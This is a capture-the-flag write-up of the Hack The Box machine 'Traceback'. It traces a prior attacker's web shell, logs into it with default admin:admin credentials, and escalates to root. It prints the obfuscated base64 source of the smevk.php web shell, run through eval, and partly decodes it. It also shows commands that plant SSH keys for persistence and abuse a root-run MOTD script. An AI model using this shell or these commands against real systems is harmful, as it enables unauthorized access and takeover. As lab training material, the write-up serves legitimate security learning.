---
title: "Traceback"
difficulty: Easy
os: Linux
points: 20
rating: 4
date: 2020-03-14
avatar: assets/htb/traceback.png
tags: [Information Disclosure, Default Credentials, Misconfiguration, Reconnaissance, SUDO Exploitation, PHP, Lua, Apache]
htb_url: https://app.hackthebox.com/machines/Traceback
---
## Overview

Traceback is an easy Linux box that serves as a solid intro to web shells, and to retracing the path a prior attacker took to break into a server \(and then deface it!\).  

## Enumeration

### Nmap scan

I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flag set is: `-p-`, a shorthand telling nmap to cover every TCP port, `-sC`, which is the same as `--script=default` and fires off nmap's default enumeration scripts at the host, `-sV` for service/version detection, and `-oN <name>` to write the results to a file called `<name>`.

```text
kac0@kali:~/htb/traceback$ nmap -p- -sC -sV -oN traceback.nmap <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:39 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)                                        
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)                                      
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                    
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                           
|_http-title: Help us                                                                                  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                
                                                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .         
Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
```

### SSH

Only two ports came back open: 22 (SSH) and 80 (HTTP). My first move was to connect to SSH:

```text
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
```

I couldn't authenticate, but the login banner revealed that the box had been compromised by someone going by `Xh4H`, who attributed it to weak configuration. 

### HTTP

![](assets/wu/traceback/fix-5.png)

Browsing to port 80 presented a nearly identical message. It also mentioned a backdoor, so with no other leads to follow I launched `gobuster` to hunt for additional pages.  

```text
gobuster dir -u http://<YOUR_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o traceback.gobuster
```

This turned up nothing useful, since the connection was being blocked.

### FREE INTERNETZZZ - Twitter OSINT

My next idea was to search the web for `FREE INTERNETZZZ`, which surprisingly pointed me to Twitter.

![](assets/wu/traceback/img-2.png)

"Pretty interesting collection of webshells:" reads the tweet from the box's [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936), posted right around the release date \(14 Mar 2020 - See [info card](traceback-write-up.md#overview)\).  To me this had the feel of an OSINT-style challenge.   Following the post took me to a set of "Some of the best web shells that you might need" hosted at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).

I had no idea which shell had actually been deployed, and the clue from `Xh4H` only pointed at a GitHub repo full of shells. I grabbed all of them and dug through the source looking for something recognizable, but the bulk of it was obfuscated and the string `FREE INTERNETZZZ` didn't appear in any file. So I built a list of the filenames and ran `wfuzz` against the site to see whether any of them had been dropped there. _\(While hoping the filename hadn't been renamed!\)_

```bash
kac0@kali:~/htb/traceback/webshells$ ls -1 > webshells
kac0@kali:~/htb/traceback/webshells$ wfuzz -c -w webshells --sc 200 http://<YOUR_IP>/FUZZ
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://<YOUR_IP>/FUZZ
Total requests: 34

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
===================================================================

000000016:   200        58 L     100 W    1261 Ch     "smevk.php"                                                                                                                                       
000000033:   200        58 L     100 W    1261 Ch     "smevk.php"                                                                                                                                       

Total time: 1.884043
Processed Requests: 34
Filtered Requests: 32
Requests/sec.: 18.04628
```

## Initial Foothold

### Smevk\_Pathan Shell v3

`wfuzz` revealed the deployed web shell at `http://<YOUR_IP>/smevk.php`.Browsing to it presented a login screen.

![](assets/wu/traceback/img-3.png)

I pulled up the source of the `smevk.php` shell I'd downloaded earlier, and it took only a moment to spot what I needed.

```text
<?php 
/*
SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
https://www.facebook.com/smevkpathan
smevkpathan@gmail.com
Edit Shell according to your choice.
Domain read bypass.
Enjoy!
*/
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
//Change Shell Theme here//
$color = "#8B008B";                                   //Fonts color modify here.
$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
$TabsColor = '#0E5061';                              //Change tabs color here.
#-------------------------------------------------------------------------------

?>
<?php
$smevk = "PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
SFRUUF9VU0VSX0FHRU5UJ10sJ0dvb2dsZScpICE9PSBmYWxzZSApIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwog\
ICAgZXhpdDsKfQoKQHNlc3Npb25fc3RhcnQoKTsKQGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7CkBp\
bmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsMCk7CkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGlt\
ZScsMCk7CkBzZXRfdGltZV9saW1pdCgwKTsKQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKaWYoIGdldF9tYWdpY19xdW90ZXNfZ3Bj\
KCkgKSB7CiAgICBmdW5jdGlvbiBzdHJpcHNsYXNoZXNfYXJyYXkoJGFycmF5KSB7CiAgICAgICAgcmV0dXJuIGlzX2FycmF5KCRhcnJheSkg\
PyBhcnJheV9tYXAoJ3N0cmlwc2xhc2hlc19hcnJheScsICRhcnJheSkgOiBzdHJpcHNsYXNoZXMoJGFycmF5KTsKICAgIH0KICAgICRfUE9T\
VCA9IHN0cmlwc2xhc2hlc19hcnJheSgkX1BPU1QpOwp9CgpmdW5jdGlvbiBwcmludExvZ2luKCkgewogaWYgKCRfUE9TVFsncGFzcyddICE9\
ICRhdXRoX3Bhc3MgJiYgJF9QT1NUWyd1bmFtZSddICE9ICRVc2VyTmFtZSkgewogICAgJHN0YXR1cyA9ICdXcm9uZyBQYXNzd29yZCBvciBV\
...snipped...
ZXhpc3RzKCdhY3Rpb24nIC4gJF9QT1NUWydhJ10pICkKICAgIGNhbGxfdXNlcl9mdW5jKCdhY3Rpb24nIC4gJF9QT1NUWydhJ10pCgo/Pg==";
eval("?>".(base64_decode($smevk)));
?>
```

The shell shipped with hard-coded default credentials of `admin:admin`. Entering them on the login page let me straight into the shell interface.

![](assets/wu/traceback/img-4.png)

My first attempts to explore the system, clicking buttons and trying to enumerate through the shell, were frustrating.  Nothing appeared to respond.  Here are my original notes:

> It seems as if a lot of the functionality was stripped out...most of the buttons do nothing. Never mind...DOESNT WORK IN FIREFOX!!!! &gt; worked just fine in Chromium!

For whatever reason the web shell misbehaved in Firefox.  Once I'd had enough of fighting with it, I tried loading it in Chromium instead...and suddenly everything worked!

```text
kac0@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
SFRUUF9VU0VSX0FHRU5UJ10sJ0dvb2dsZScpICE9PSBmYWxzZSApIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwog\
ICAgZXhpdDsKfQoKQHNlc3Npb25fc3RhcnQoKTsKQGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7CkBp\
bmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsMCk7CkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGlt\
ZScsMCk7CkBzZXRfdGltZV9saW1pdCgwKTsKQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKaWYoIGdldF9tYWdpY19xdW90ZXNfZ3Bj\
KCkgKSB7CiAgICBmdW5jdGlvbiBzdHJpcHNsYXNoZXNfYXJyYXkoJGFycmF5KSB7CiAgICAgICAgcmV0dXJuIGlzX2FycmF5KCRhcnJheSkg\
PyBhcnJheV9tYXAoJ3N0cmlwc2xhc2hlc19hcnJheScsICRhcnJheSkgOiBzdHJpcHNsYXNoZXMoJGFycmF5KTsKICAgIH0KICAgICRfUE9T\
VCA9IHN0cmlwc2xhc2hlc19hcnJheSgkX1BPU1QpOwp9CgpmdW5jdGlvbiBwcmludExvZ2luKCkgewogaWYgKCRfUE9TVFsncGFzcyddICE9\
ICRhdXRoX3Bhc3MgJiYgJF9QT1NUWyd1bmFtZSddICE9ICRVc2VyTmFtZSkgewogICAgJHN0YXR1cyA9ICdXcm9uZyBQYXNzd29yZCBvciBV\
c2VyTmFtZSA6KCc7CiAgICAKCn0KCj8' | base64 -d
<?php

$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}

function printLogin() {
 if ($_POST['pass'] != $auth_pass && $_POST['uname'] != $UserName) {
    $status = 'Wrong Password or UserName :(';
}
```

After some debugging and a closer read of the code, it looked like the shell checks whether the HTTP\_USER\_AGENT contains 'Google'. I couldn't see why that would matter here, since it returns a 404 only when the agent IS Google. That's likely just there to stop Google's crawlers from indexing the page and exposing the backdoor.  Using the unPHP decoder at [https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/](https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/) I went through the rest of the backdoor's code hunting for whatever broke it in Firefox, but nothing stood out.

## Road to User

![](assets/wu/traceback/img-5.png)

The web shell indicated the account it ran as was `webadmin`, so I figured I'd append my public SSH key to that user's `.ssh/authorized_keys` file and see if I could log in over SSH. I ran `echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/webadmin/.ssh/authorized_keys` from the web shell's `Console` field.  _\(See the append operator `>>`?  Be considerate to other players and avoid clobbering the whole file with `>`!\)_

Per [https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/), you can also accomplish this from a terminal with**`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host`**, though that requires being able to authenticate to the host beforehand.  

### Enumeration as `webadmin`

With my public key in place, logging into the box over SSH with my private key was trivial.

```text
kac0@kali:~/htb/traceback$ ssh webadmin@<YOUR_IP>
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$ whoami && hostname
webadmin
traceback
```

Whenever I land a new user, my first step is to check my privileges and see what I'm allowed to run via `sudo` using the `-l` flag.

```text
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

It turned out I could run the `luvit` binary in `sysadmin`'s home directory as that user, no password required.

### Making user creds

```text
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
>
```

A little reading on `luvit` told me it's basically a `lua` language shell.  

> Repl\#
>
> Implementation of a read-execute-print-loop in Luvit. Used by the Luvit repl which is returned when the Luvit binary is executed without args.

From [https://www.lua.org/pil/22.2.html](https://www.lua.org/pil/22.2.html) I learned I could run system commands with the syntax `os.execute("mkdir " .. dirname)`. 

```lua
> os.execute("ls")
note.txt
true    'exit'  0
> os.execute("cat" .. "note.txt")
sh: 1: catnote.txt: not found
nil     'exit'  127
```

_One quick gotcha... you have to insert a space between the command and its argument yourself, because this simply joins the two strings and runs the result. The space can sit at the end of the command or the start of the argument._

### User.txt

```lua
> os.execute("cat" .. " note.txt")
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
true    'exit'  0
> os.execute("ls " .. "/home/sysadmin")
luvit  user.txt
true    'exit'  0
> os.execute("cat " .. "/home/sysadmin/user.txt")
6e0b************************1419
true    'exit'  0
```

### Getting a shell as `sysadmin`

While researching command execution in the `luvit` shell, I found [https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html), which showed a way to run commands more involved than the basic "command" .. "argument" form.

```text
> os.execute 'echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/sysadmin/.ssh/authorized_keys'
```

I leveraged this to once more drop my public SSH key for the new user, then logged in via SSH.

```text
kac0@kali:~/htb/traceback$ ssh sysadmin@<YOUR_IP>
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$ whoami
sysadmin
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `sysadmin`

I landed in `/bin/sh`, which was fairly restrictive \(no history, arrow keys, tab completion, etc\), so I reached for my usual python PTY upgrade trick, but it failed.  _It was late and I was tired, so I looked up the Perl equivalent, which was installed, and used `perl -e 'exec "/bin/bash";'`.   Coming back to it the next morning, I realized python really wasn't installed...but python3 was!  Doh!_

Since I couldn't inspect sudo rights without a password, I turned to the running processes instead.  An odd `sleep 30` process owned by root caught my eye, so I dug into the root-owned processes with `ps -U root -u root` _\(from the man page\)_.

```text
sysadmin@traceback:/$ ps -U root -u root
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...snipped
root        268  0.0  0.4 128080 17252 ?        S<s  14:17   0:00 /lib/systemd/systemd-journald
root        277  0.0  0.1  45732  4556 ?        Ss   14:17   0:02 /lib/systemd/systemd-udevd
root        278  0.0  0.0      0     0 ?        I<   14:17   0:00 [ttm_swap]
root        279  0.0  0.0      0     0 ?        S    14:17   0:00 [irq/16-vmwgfx]
root        287  0.0  0.0 158788   300 ?        Ssl  14:17   0:00 vmware-vmblock-fuse /run/vmblock-fuse 
root        396  0.0  0.2  88224  9700 ?        Ss   14:17   0:00 /usr/bin/VGAuthService
root        398  0.0  0.2 201880 11808 ?        Ssl  14:17   0:05 /usr/bin/vmtoolsd
root        435  0.0  0.0 110512  3556 ?        Ssl  14:17   0:00 /usr/sbin/irqbalance --foreground
root        438  0.0  0.0  31320  3156 ?        Ss   14:17   0:00 /usr/sbin/cron -f
root        440  0.0  0.4 170524 17316 ?        Ssl  14:17   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        441  0.0  0.1  70608  5896 ?        Ss   14:17   0:00 /lib/systemd/systemd-logind
root        450  0.0  0.1 287544  6828 ?        Ssl  14:17   0:00 /usr/lib/accountsservice/accounts-daem
...snipped...
root      10010  0.0  0.1  63516  4220 pts/2    S+   16:43   0:00 sudo -u sysadmin /home/sysadmin/luvit
root      10209  0.0  0.0  58792  3152 ?        S    16:52   0:00 /usr/sbin/CRON -f
root      10212  0.0  0.0   4628   812 ?        Ss   16:52   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
root      10213  0.0  0.0   7468   840 ?        S    16:52   0:00 sleep 30
```

A script was firing every 30 seconds to restore a backup of the MOTD \(message of the day\), which clearly stood out, so I inspected both directories referenced in the command for anything I could use.

```text
sysadmin@traceback:/var/backups/.update-motd.d$ cd /etc/update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Jun 22 17:07 00-header
-rwxrwxr-x  1 root sysadmin  982 Jun 22 17:07 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jun 22 17:07 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jun 22 17:07 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jun 22 17:07 91-release-upgrade
```

Notably, `sysadmin` had write access to the files in `/etc/update-motd.d/`. _\(The backups, however, were not writable\)._

```text
sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

echo "\nWelcome to Xh4H land \n"
```

The `00-header` file appeared to have already been modified by `Xh4H` when he defaced the site and planted his web shell. Since MOTD banners are simply bash scripts executed on each user login, and both the files and the process running them were owned by `root`, I figured I'd append a line of my own and attempt a privilege escalation.  

### Getting a root shell

Based on the `ps` output, a cronjob copies the backups from `/var/backups/.update-motd.d/` over to `/etc/update-motd.d/` every 30 seconds. That gave me a narrow window to edit the file and trigger it before the backup overwrote my changes. I went for it and reused the very same privilege escalation technique I'd applied for the previous users. 

```text
sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /root/.ssh/authorized_keys' >> 00-header
```

I took the same `echo` command I'd used to escalate to the prior two users and wrote it into the `00-header` MOTD file. This time it was set to append my public SSH key to the `authorized_keys` file in the `/root/.ssh/` directory. 

To trigger my command, the MOTD program had to run. Because it runs automatically at login, I just logged out, reconnected to `sysadmin` over SSH, logged out once more, and then logged in as `root`.

```text
kac0@kali:~/htb/traceback$ ssh root@<YOUR_IP>
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jan 24 03:43:29 2020
root@traceback:~# whoami && hostname
root
traceback
```

### Root.txt

And of course, I made sure to grab my well-earned proof!

```text
root@traceback:~# cat root.txt 
459b************************cfa7
```
